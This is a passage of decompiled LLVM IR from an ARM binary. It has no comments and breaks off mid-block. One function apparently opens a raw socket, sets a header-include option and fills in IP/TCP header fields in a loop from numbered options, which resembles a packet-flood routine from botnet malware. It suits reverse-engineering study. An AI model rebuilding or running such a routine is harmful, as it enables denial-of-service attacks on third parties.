  %v4_c69c = inttoptr i32 %v3_c69c to i8*
  store i8 %v1_c69c, i8* %v4_c69c, align 1
  %v3_c6a0 = load i32, i32* @r6, align 4
  %v4_c6a0 = add i32 %v3_c6a0, 2
  %v5_c6a0 = inttoptr i32 %v4_c6a0 to i8*
  store i8 %v1_c68c, i8* %v5_c6a0, align 1
  %v0_c6a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6a4, label %dec_label_pc_c6a8, label %dec_label_pc_c68c.dec_label_pc_c504_crit_edge

dec_label_pc_c68c.dec_label_pc_c504_crit_edge:    ; preds = %dec_label_pc_c68c
  %v1_c508.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c504

dec_label_pc_c6a8:                                ; preds = %dec_label_pc_c68c, %dec_label_pc_c4f8
  %v0_c6a8 = call i32 @function_fe24()
  store i32 %v6_c094, i32* %r2.global-to-local, align 4
  %v1_c6b0 = load i32, i32* @r4, align 4
  %v9_c6b0 = icmp eq i32 %v6_c094, %v1_c6b0
  store i1 %v9_c6b0, i1* %cpsr_z.global-to-local, align 1
  %v1_c6b4 = load i32, i32* @r6, align 4
  %v2_c6b4 = add i32 %v1_c6b4, 4
  %v3_c6b4 = inttoptr i32 %v2_c6b4 to i32*
  store i32 %v0_c6a8, i32* %v3_c6b4, align 4
  br i1 %v9_c6b0, label %dec_label_pc_c6bc, label %dec_label_pc_c510

dec_label_pc_c6bc:                                ; preds = %dec_label_pc_c6a8, %dec_label_pc_c504
  %v0_c6bc = call i32 @function_fe24()
  store i32 %v1_c164, i32* %r3.global-to-local, align 4
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  %v1_c6c8 = load i32, i32* @r6, align 4
  %v2_c6c8 = add i32 %v1_c6c8, 8
  %v3_c6c8 = inttoptr i32 %v2_c6c8 to i32*
  store i32 %v0_c6bc, i32* %v3_c6c8, align 4
  br i1 %v2_c6c4, label %dec_label_pc_c51c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c510, %dec_label_pc_c6bc
  %v0_c6d0 = load i32, i32* @r5, align 4
  %v1_c6d0 = add i32 %v0_c6d0, 40
  store i32 %v6_c13c, i32* @r1, align 4
  %v1_c6d8 = inttoptr i32 %v1_c6d0 to i8*
  %v2_c6d8 = call i32 @function_10000(i8* %v1_c6d8)
  br label %dec_label_pc_c51c

dec_label_pc_c6e0:                                ; preds = %dec_label_pc_c1c4
  store i32 %v6_c13c, i32* %r3.global-to-local, align 4
  %v1_c6e8 = add i32 %v6_c13c, 40
  store i32 %v1_c6e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c474.preheader

; uselistorder directives
  uselistorder i32 %v1_c6e8, { 1, 0 }
  uselistorder i32 %v4_c694, { 1, 0 }
  uselistorder i32 %v2_c624, { 1, 0 }
  uselistorder i32 %v3_c5f4, { 1, 0 }
  uselistorder i32 %v3_c5d0, { 1, 3, 2, 0 }
  uselistorder i32 %v0_c5b0, { 1, 2, 0 }
  uselistorder i32 %v1_c5ac, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c53c, { 1, 0, 2 }
  uselistorder i32 %v0_c480, { 2, 0, 1 }
  uselistorder i32 %v0_c474, { 1, 0 }
  uselistorder i1 %v2_c6c4, { 2, 3, 1, 0 }
  uselistorder i1 %v9_c648, { 2, 3, 1, 0 }
  uselistorder i32 %v1_c45c, { 1, 0, 2, 3 }
  uselistorder i8 %v5_c2c0, { 1, 0 }
  uselistorder i32 %v1_c288, { 1, 0 }
  uselistorder i32 %v1_c284, { 1, 0 }
  uselistorder i32 %v1_c280, { 1, 0 }
  uselistorder i32 %v1_c25c, { 1, 0 }
  uselistorder i32 %v1_c258, { 1, 0 }
  uselistorder i32 %v1_c254, { 1, 0 }
  uselistorder i32 %v1_c248, { 1, 0 }
  uselistorder i32 %v1_c224, { 1, 0 }
  uselistorder i32 %v1_c214, { 1, 0 }
  uselistorder i32 %v1_c200, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c1e0, { 1, 0, 2 }
  uselistorder i32 %v3_c1d4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_c1c8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_c1c4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_c1bc, { 1, 0 }
  uselistorder i1 %v7_c190, { 1, 0 }
  uselistorder i32 %v3_c18c, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_c178, { 4, 3, 0, 5, 1, 2 }
  uselistorder i32 %v1_c164, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_c13c, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32 %v6_c094, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c078, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 %v1_c028, { 1, 0 }
  uselistorder i32 %v6_bfc0, { 1, 0 }
  uselistorder i32 %v2_bfa8, { 0, 3, 1, 2 }
  uselistorder i32 %v1_bf8c, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r1.global-to-local, { 33, 34, 35, 36, 37, 38, 39, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 30, 29, 32, 31, 0 }
  uselistorder i32* %ip.global-to-local, { 15, 16, 17, 18, 19, 20, 21, 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i1* %cpsr_z.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c5c8, { 1, 0 }
  uselistorder label %dec_label_pc_c51c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c474.preheader, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c6fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c6fc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c6fc = load i32, i32* @r4, align 4
  %v12_c6fc = load i32, i32* @r7, align 4
  %v1_c700 = urem i32 %arg1, 256
  store i32 %v1_c700, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_c700, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_c718 = urem i32 %arg3, 256
  store i32 %v1_c718, i32* @r4, align 4
  %v2_c71c = call i32 @function_13a94(i32 %v1_c700, i32 4)
  %v0_c720 = load i32, i32* @r5, align 4
  store i32 %v0_c720, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c71c, i32* %fp.global-to-local, align 4
  %v0_c730 = load i32, i32* @r4, align 4
  store i32 %v0_c730, i32* %r0.global-to-local, align 4
  %v4_c734 = inttoptr i32 %v0_c720 to i32*
  %v5_c734 = call i32 @function_a4e8(i32 %v0_c730, i32* %v4_c734, i32 2, i32 0)
  %v1_c740 = urem i32 %v5_c734, 256
  store i32 %v1_c740, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c74c = load i32, i32* @r5, align 4
  store i32 %v0_c74c, i32* %r1.global-to-local, align 4
  %v0_c750 = load i32, i32* @r4, align 4
  store i32 %v0_c750, i32* %r0.global-to-local, align 4
  %v5_c754 = trunc i32 %v5_c734 to i8
  %v6_c758 = inttoptr i32 %v0_c74c to i32*
  %v7_c758 = call i32 @function_a4e8(i32 %v0_c750, i32* %v6_c758, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_c75c = load i32, i32* @r5, align 4
  store i32 %v0_c75c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c76c = load i32, i32* @r4, align 4
  store i32 %v0_c76c, i32* %r0.global-to-local, align 4
  %v5_c770 = inttoptr i32 %v0_c75c to i32*
  %v6_c770 = call i32 @function_a4e8(i32 %v0_c76c, i32* %v5_c770, i32 4, i32 64)
  %v1_c778 = urem i32 %v6_c770, 256
  store i32 %v1_c778, i32* %ip.global-to-local, align 4
  %v0_c77c = load i32, i32* @r5, align 4
  store i32 %v0_c77c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c788 = load i32, i32* @r4, align 4
  store i32 %v0_c788, i32* %r0.global-to-local, align 4
  %v6_c790 = inttoptr i32 %v0_c77c to i32*
  %v7_c790 = call i32 @function_a4e8(i32 %v0_c788, i32* %v6_c790, i32 5, i32 1)
  %v1_c79c = urem i32 %v7_c790, 256
  store i32 %v1_c79c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c7a8 = load i32, i32* @r5, align 4
  store i32 %v0_c7a8, i32* %r1.global-to-local, align 4
  %v0_c7ac = load i32, i32* @r4, align 4
  store i32 %v0_c7ac, i32* %r0.global-to-local, align 4
  %v5_c7b4 = inttoptr i32 %v0_c7a8 to i32*
  %v6_c7b4 = call i32 @function_a4e8(i32 %v0_c7ac, i32* %v5_c7b4, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_c7bc = load i32, i32* @r5, align 4
  store i32 %v0_c7bc, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c7b4, i32* @r7, align 4
  %v0_c7cc = load i32, i32* @r4, align 4
  store i32 %v0_c7cc, i32* %r0.global-to-local, align 4
  %v4_c7d0 = inttoptr i32 %v0_c7bc to i32*
  %v5_c7d0 = call i32 @function_a4e8(i32 %v0_c7cc, i32* %v4_c7d0, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_c7d8 = load i32, i32* @r5, align 4
  store i32 %v0_c7d8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c7d0, i32* @r6, align 4
  %v0_c7e8 = load i32, i32* @r4, align 4
  store i32 %v0_c7e8, i32* %r0.global-to-local, align 4
  %v4_c7ec = inttoptr i32 %v0_c7d8 to i32*
  %v5_c7ec = call i32 @function_a4e8(i32 %v0_c7e8, i32* %v4_c7ec, i32 17, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_c7f0 = load i32, i32* @r5, align 4
  store i32 %v0_c7f0, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c800 = load i32, i32* @r4, align 4
  store i32 %v0_c800, i32* %r0.global-to-local, align 4
  %v5_c804 = inttoptr i32 %v0_c7f0 to i32*
  %v6_c804 = call i32 @function_a4e8(i32 %v0_c800, i32* %v5_c804, i32 18, i32 0)
  %v0_c808 = load i32, i32* @r5, align 4
  store i32 %v0_c808, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c818 = load i32, i32* @r4, align 4
  store i32 %v0_c818, i32* %r0.global-to-local, align 4
  %v5_c81c = inttoptr i32 %v0_c808 to i32*
  %v6_c81c = call i32 @function_a4e8(i32 %v0_c818, i32* %v5_c81c, i32 11, i32 0)
  %v0_c820 = load i32, i32* @r5, align 4
  store i32 %v0_c820, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c830 = load i32, i32* @r4, align 4
  store i32 %v0_c830, i32* %r0.global-to-local, align 4
  %v5_c834 = inttoptr i32 %v0_c820 to i32*
  %v6_c834 = call i32 @function_a4e8(i32 %v0_c830, i32* %v5_c834, i32 12, i32 0)
  %v0_c838 = load i32, i32* @r5, align 4
  store i32 %v0_c838, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c848 = load i32, i32* @r4, align 4
  store i32 %v0_c848, i32* %r0.global-to-local, align 4
  %v5_c84c = inttoptr i32 %v0_c838 to i32*
  %v6_c84c = call i32 @function_a4e8(i32 %v0_c848, i32* %v5_c84c, i32 13, i32 0)
  %v0_c850 = load i32, i32* @r5, align 4
  store i32 %v0_c850, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c860 = load i32, i32* @r4, align 4
  store i32 %v0_c860, i32* %r0.global-to-local, align 4
  %v5_c864 = inttoptr i32 %v0_c850 to i32*
  %v6_c864 = call i32 @function_a4e8(i32 %v0_c860, i32* %v5_c864, i32 14, i32 0)
  %v0_c868 = load i32, i32* @r5, align 4
  store i32 %v0_c868, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c878 = load i32, i32* @r4, align 4
  store i32 %v0_c878, i32* %r0.global-to-local, align 4
  %v5_c87c = inttoptr i32 %v0_c868 to i32*
  %v6_c87c = call i32 @function_a4e8(i32 %v0_c878, i32* %v5_c87c, i32 15, i32 1)
  %v0_c880 = load i32, i32* @r5, align 4
  store i32 %v0_c880, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c890 = load i32, i32* @r4, align 4
  store i32 %v0_c890, i32* %r0.global-to-local, align 4
  %v5_c894 = inttoptr i32 %v0_c880 to i32*
  %v6_c894 = call i32 @function_a4e8(i32 %v0_c890, i32* %v5_c894, i32 16, i32 0)
  %v2_c8a0 = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_c8a0, i32* %r3.global-to-local, align 4
  %v0_c8a4 = load i32, i32* @r5, align 4
  store i32 %v0_c8a4, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c8ac = load i32, i32* @r4, align 4
  store i32 %v0_c8ac, i32* %r0.global-to-local, align 4
  %v5_c8b0 = inttoptr i32 %v0_c8a4 to i32*
  %v6_c8b0 = call i32 @function_a47c(i32 %v0_c8ac, i32* %v5_c8b0, i32 25, i32 %v2_c8a0, i32 %v6_c894)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c8c4 = call i32 @function_13790(i32 2, i32 3, i32 6)
  store i32 %v3_c8c4, i32* %r0.global-to-local, align 4
  %v7_c8c8 = icmp eq i32 %v3_c8c4, -1
  store i1 %v7_c8c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c8c4, i32* %sb.global-to-local, align 4
  br i1 %v7_c8c8, label %dec_label_pc_ce34, label %dec_label_pc_c8d4

dec_label_pc_c8d4:                                ; preds = %dec_label_pc_c6fc
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c8dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c8dc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_c8f0 = call i32 @function_13760(i32 %v3_c8c4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_c8f0, i32* %r0.global-to-local, align 4
  %v7_c8f4 = icmp eq i32 %v6_c8f0, -1
  store i1 %v7_c8f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c8f4, label %dec_label_pc_ce2c, label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8d4
  store i32 0, i32* %stack_var_-40, align 4
  %v0_c910 = load i32, i32* @r7, align 4
  %v3_c910 = mul i32 %v0_c910, 65536
  store i32 %v3_c910, i32* %r4.global-to-local, align 4
  %v0_c914 = load i32, i32* @r6, align 4
  %v3_c918 = urem i32 %v7_c758, 65536
  store i32 %v3_c918, i32* %r3.global-to-local, align 4
  %v3_c91c = urem i32 %v0_c910, 65536
  store i32 %v3_c91c, i32* %ip.global-to-local, align 4
  %v3_c920 = urem i32 %v0_c914, 65536
  store i32 %v3_c920, i32* %r0.global-to-local, align 4
  %v1_c924 = urem i32 %v6_c81c, 256
  store i32 %v1_c924, i32* %r2.global-to-local, align 4
  %v0_c928 = load i32, i32* @sl, align 4
  %v2_c928 = icmp eq i32 %v0_c928, 0
  store i1 %v2_c928, i1* %cpsr_z.global-to-local, align 1
  %tmp69 = icmp slt i32 %v0_c928, 1
  br i1 %tmp69, label %dec_label_pc_cbd8, label %dec_label_pc_c940

dec_label_pc_c940:                                ; preds = %dec_label_pc_c8fc
  %v1_c950 = urem i32 %v0_c910, 256
  %v1_c958 = urem i32 %v7_c758, 256
  %v1_c95c = urem i32 %v0_c914, 256
  %tmp70 = mul i32 %v5_c7ec, 256
  %v3_c964 = mul nuw nsw i32 %v1_c95c, 256
  %v1_c968 = and i32 %tmp70, 65280
  %tmp71 = udiv i32 %v0_c914, 256
  %v4_c96c = urem i32 %tmp71, 256
  %v5_c96c = or i32 %v4_c96c, %v3_c964
  store i32 %v5_c96c, i32* @r6, align 4
  %tmp72 = udiv i32 %v5_c7ec, 256
  %v4_c970 = urem i32 %tmp72, 256
  %v5_c970 = or i32 %v4_c970, %v1_c968
  store i32 %v5_c970, i32* @r5, align 4
  %v3_c97c = mul nuw nsw i32 %v1_c958, 256
  %v1_c980 = urem i32 %v6_c81c, 2
  %tmp73 = udiv i32 %v7_c758, 256
  %v4_c984 = urem i32 %tmp73, 256
  %v5_c984 = or i32 %v4_c984, %v3_c97c
  store i32 %v5_c984, i32* @lr, align 4
  %v1_c988 = urem i32 %v6_c834, 2
  %v3_c998 = mul nuw nsw i32 %v1_c950, 256
  store i32 %v3_c998, i32* %r1.global-to-local, align 4
  %tmp74 = udiv i32 %v0_c910, 256
  %v4_c9a4 = urem i32 %tmp74, 256
  %v5_c9a4 = or i32 %v4_c9a4, %v3_c998
  store i32 %v5_c9a4, i32* @r7, align 4
  %v1_c9a8 = urem i32 %v6_c84c, 2
  %v1_c9ac = urem i32 %v6_c864, 2
  %v1_c9b0 = urem i32 %v6_c87c, 2
  %v1_c9c0 = urem i32 %v6_c894, 2
  store i32 %v1_c9c0, i32* %r0.global-to-local, align 4
  store i32 %v1_c958, i32* %r2.global-to-local, align 4
  store i32 %v1_c950, i32* %r3.global-to-local, align 4
  store i32 %v1_c95c, i32* %ip.global-to-local, align 4
  %v5_c9d0 = trunc i32 %tmp73 to i8
  %v5_c9e0 = trunc i32 %v0_c914 to i8
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_c770, 16777216
  %v4_ca30 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v7_c758, 16777216
  %v4_ca48 = sdiv i32 %sext8, 16777216
  %tmp = sub nsw i32 0, %v1_c980
  %v4_caa4 = and i32 %tmp, 32
  %tmp78 = sub nsw i32 0, %v1_c988
  %v4_cab8 = and i32 %tmp78, 16
  %tmp79 = sub nsw i32 0, %v1_c9a8
  %v4_cacc = and i32 %tmp79, 8
  %tmp80 = sub nsw i32 0, %v1_c9ac
  %v4_cae0 = and i32 %tmp80, 4
  %tmp81 = sub nsw i32 0, %v1_c9b0
  %v3_caf4 = and i32 %tmp81, 2
  %v7_cb24 = sext i8 %v5_c9e0 to i32
  %sext77 = mul i32 %v0_c910, 16777216
  %v3_cb24 = sdiv i32 %sext77, 16777216
  br label %dec_label_pc_c9e8

dec_label_pc_c9e8:                                ; preds = %bb76, %dec_label_pc_c940
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c9f0 = call i32 @function_13a94(i32 128, i32 1)
  store i32 %v2_c9f0, i32* %r0.global-to-local, align 4
  %v3_c9f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c9f4, i32* %r2.global-to-local, align 4
  %v1_c9f8 = load i32, i32* %fp.global-to-local, align 4
  %v2_c9f8 = load i32, i32* @r4, align 4
  %v5_c9f8 = mul i32 %v2_c9f8, 4
  %v6_c9f8 = add i32 %v5_c9f8, %v1_c9f8
  %v7_c9f8 = inttoptr i32 %v6_c9f8 to i32*
  store i32 %v2_c9f0, i32* %v7_c9f8, align 4
  %v0_c9fc = load i32, i32* %fp.global-to-local, align 4
  %v1_c9fc = load i32, i32* %r2.global-to-local, align 4
  %v4_c9fc = mul i32 %v1_c9fc, 4
  %v5_c9fc = add i32 %v4_c9fc, %v0_c9fc
  %v6_c9fc = inttoptr i32 %v5_c9fc to i32*
  %v7_c9fc = load i32, i32* %v6_c9fc, align 4
  store i32 %v7_c9fc, i32* %r4.global-to-local, align 4
  %v1_ca00 = inttoptr i32 %v7_c9fc to i8*
  %v2_ca00 = load i8, i8* %v1_ca00, align 1
  %tmp82 = urem i8 %v2_ca00, 16
  %v1_ca04 = zext i8 %tmp82 to i32
  %v1_ca08 = or i32 %v1_ca04, 64
  store i32 %v1_ca08, i32* %r3.global-to-local, align 4
  %v1_ca0c = trunc i32 %v1_ca08 to i8
  store i8 %v1_ca0c, i8* %v1_ca00, align 1
  %v0_ca10 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca10 = inttoptr i32 %v0_ca10 to i8*
  %v2_ca10 = load i8, i8* %v1_ca10, align 1
  %v1_ca14 = and i8 %v2_ca10, -16
  %v1_ca18 = or i8 %v1_ca14, 5
  store i32 %v1_c79c, i32* %r0.global-to-local, align 4
  store i8 %v1_ca18, i8* %v1_ca10, align 1
  %v2_ca28 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca28 = add i32 %v2_ca28, 1
  %v4_ca28 = inttoptr i32 %v3_ca28 to i8*
  store i8 %v5_c754, i8* %v4_ca28, align 1
  store i32 %v4_ca30, i32* %r2.global-to-local, align 4
  %v2_ca34 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca34 = add i32 %v2_ca34, 4
  %v4_ca34 = inttoptr i32 %v3_ca34 to i8*
  store i8 %v5_c9d0, i8* %v4_ca34, align 1
  store i32 6, i32* %ip.global-to-local, align 4
  %v0_ca40 = load i32, i32* %r0.global-to-local, align 4
  %v2_ca40 = icmp eq i32 %v0_ca40, 0
  store i1 %v2_ca40, i1* %cpsr_z.global-to-local, align 1
  %v2_ca44 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca44 = add i32 %v2_ca44, 3
  %v4_ca44 = inttoptr i32 %v3_ca44 to i8*
  store i8 60, i8* %v4_ca44, align 1
  store i32 %v4_ca48, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ca50 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca50 = trunc i32 %v0_ca50 to i8
  %v2_ca50 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca50 = add i32 %v2_ca50, 8
  %v4_ca50 = inttoptr i32 %v3_ca50 to i8*
  store i8 %v1_ca50, i8* %v4_ca50, align 1
  %v0_ca54 = load i32, i32* %ip.global-to-local, align 4
  %v1_ca54 = trunc i32 %v0_ca54 to i8
  %v2_ca54 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca54 = add i32 %v2_ca54, 9
  %v4_ca54 = inttoptr i32 %v3_ca54 to i8*
  store i8 %v1_ca54, i8* %v4_ca54, align 1
  %v0_ca58 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca58 = trunc i32 %v0_ca58 to i8
  %v2_ca58 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca58 = add i32 %v2_ca58, 2
  %v4_ca58 = inttoptr i32 %v3_ca58 to i8*
  store i8 %v1_ca58, i8* %v4_ca58, align 1
  %v3_ca5c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ca5c, i32* %r2.global-to-local, align 4
  %v0_ca60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca60, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c9e8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_ca64 = load i32, i32* %r4.global-to-local, align 4
  %v4_ca64 = add i32 %v3_ca64, 6
  %v5_ca64 = inttoptr i32 %v4_ca64 to i8*
  store i8 64, i8* %v5_ca64, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c9e8, %bb
  %v0_ca68 = load i32, i32* %r0.global-to-local, align 4
  %v1_ca68 = trunc i32 %v0_ca68 to i8
  %v2_ca68 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca68 = add i32 %v2_ca68, 5
  %v4_ca68 = inttoptr i32 %v3_ca68 to i8*
  store i8 %v1_ca68, i8* %v4_ca68, align 1
  %v0_ca6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca6c, label %.thread9, label %bb75

.thread9:                                         ; preds = %.thread
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  br label %bb76

bb75:                                             ; preds = %.thread
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  %v3_ca74 = load i32, i32* %r4.global-to-local, align 4
  %v4_ca74 = add i32 %v3_ca74, 7
  %v5_ca74 = inttoptr i32 %v4_ca74 to i8*
  store i8 0, i8* %v5_ca74, align 1
  %v0_ca7c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb76

bb76:                                             ; preds = %.thread9, %bb75
  %v0_ca7c = phi i32 [ %v6_c8b0, %.thread9 ], [ %v0_ca7c.pre, %bb75 ]
  %v0_ca78 = load i32, i32* %r2.global-to-local, align 4
  %v3_ca78 = mul i32 %v0_ca78, 32
  store i32 %v3_ca78, i32* %r3.global-to-local, align 4
  %v1_ca7c = load i32, i32* %r4.global-to-local, align 4
  %v2_ca7c = add i32 %v1_ca7c, 12
  %v3_ca7c = inttoptr i32 %v2_ca7c to i32*
  store i32 %v0_ca7c, i32* %v3_ca7c, align 4
  %v0_ca80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca80 = load i32, i32* %r2.global-to-local, align 4
  %tmp83 = mul i32 %v1_ca80, -8
  %v5_ca80 = add i32 %v0_ca80, %tmp83
  %v1_ca84 = load i32, i32* @r8, align 4
  %v2_ca84 = add i32 %v1_ca84, %v5_ca80
  store i32 %v2_ca84, i32* %r3.global-to-local, align 4
  %v1_ca88 = add i32 %v2_ca84, 16
  %v2_ca88 = inttoptr i32 %v1_ca88 to i32*
  %v3_ca88 = load i32, i32* %v2_ca88, align 4
  store i32 %v3_ca88, i32* %r2.global-to-local, align 4
  %v0_ca8c = load i32, i32* @r7, align 4
  %v1_ca8c = trunc i32 %v0_ca8c to i8
  %v2_ca8c = load i32, i32* %r4.global-to-local, align 4
  %v3_ca8c = add i32 %v2_ca8c, 20
  %v4_ca8c = inttoptr i32 %v3_ca8c to i8*
  store i8 %v1_ca8c, i8* %v4_ca8c, align 1
  %v0_ca90 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca90 = load i32, i32* %r4.global-to-local, align 4
  %v2_ca90 = add i32 %v1_ca90, 16
  %v3_ca90 = inttoptr i32 %v2_ca90 to i32*
  store i32 %v0_ca90, i32* %v3_ca90, align 4
  %v0_ca94 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca94 = add i32 %v0_ca94, 20
